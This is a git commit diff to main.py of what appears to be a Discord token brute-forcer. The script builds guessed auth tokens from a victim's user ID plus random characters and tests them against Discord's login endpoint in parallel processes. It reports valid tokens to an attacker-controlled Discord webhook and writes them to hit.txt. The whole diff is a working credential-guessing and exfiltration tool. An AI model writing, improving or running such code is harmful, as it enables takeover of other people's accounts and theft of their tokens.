f0eadf83008ff872ae2c076712a0bd859dba2caa
erfan <125689079+S13cko@users.noreply.github.com>
2023-05-10 14:50:00 +0330

    Update main.py

--- main.py
+++ main.py
@@ -3,6 +3,7 @@ import os
 import random
 import string
 import requests
+import multiprocessing
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
 from discord_webhook import DiscordWebhook
@@ -21,27 +22,54 @@ session = requests.Session()
 session.mount("https://", http_adapter)
 
 # Encode the user ID to create the initial token
-id_to_token = base64.b64encode((input("ID TO TOKEN --> ")).encode("ascii"))
-id_to_token = str(id_to_token)[2:-1]
+id_to_token = base64.b64encode(input("ID TO TOKEN --> ").encode("ascii")).decode("ascii")
 
 # Send a "running" message to the webhook to indicate that the code has started
 webhook = DiscordWebhook(url=WEBHOOK_URL, content="@everyone Code is running")
 response = webhook.execute()
 
-# Loop to generate and test tokens
-while id_to_token == id_to_token:
-    token = id_to_token + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
-    headers={
-        'Authorization': token
-    }
-    login = session.get('https://discordapp.com/api/v9/auth/login', headers=headers)
-    try:
-        if login.status_code == 200:
-            print('[+] VALID' + ' ' + token)
-            # Write the valid token to a file
-            with open('hit.txt', 'a+') as f:
-                f.write(f'{token}\n')
-        else:
-            print('[-] INVALID' + ' ' + token)
-    finally:
-        print("")
+# Global list to store valid tokens
+valid_tokens = []
+
+# Function to generate and test tokens
+def generate_and_test_tokens(tokens):
+    for token in tokens:
+        headers = {'Authorization': token}
+        login = session.get('https://discordapp.com/api/v9/auth/login', headers=headers)
+        try:
+            if login.status_code == 200:
+                print('[+] VALID' + ' ' + token)
+                valid_tokens.append(token)  # Append valid token to the list
+            else:
+                print('[-] INVALID' + ' ' + token)
+        finally:
+            print("")
+
+# Number of processes to use
+num_processes = 4
+
+# Number of tokens to generate and test per process
+tokens_per_process = 1000
+
+# Generate tokens for each process
+tokens = []
+for _ in range(num_processes):
+    token_suffixes = [''.join(random.choices(string.ascii_letters + string.digits, k=29)) for _ in range(tokens_per_process)]
+    tokens.extend([f"{id_to_token}.{suffix}" for suffix in token_suffixes])
+
+# Split tokens into chunks for each process
+token_chunks = [tokens[i:i+tokens_per_process] for i in range(0, len(tokens), tokens_per_process)]
+
+# Create and start the processes
+pool = multiprocessing.Pool(processes=num_processes)
+pool.map(generate_and_test_tokens, token_chunks)
+pool.close()
+pool.join()
+
+# Send the valid tokens to the webhook
+for token in valid_tokens:
+    webhook = DiscordWebhook(url=WEBHOOK_URL, content=f"@everyone Valid token found: {token}")
+    webhook.execute()
+    # Write the valid token to a file
+    with open('hit.txt', 'a+') as f:
+        f.write(f'{token}\n')
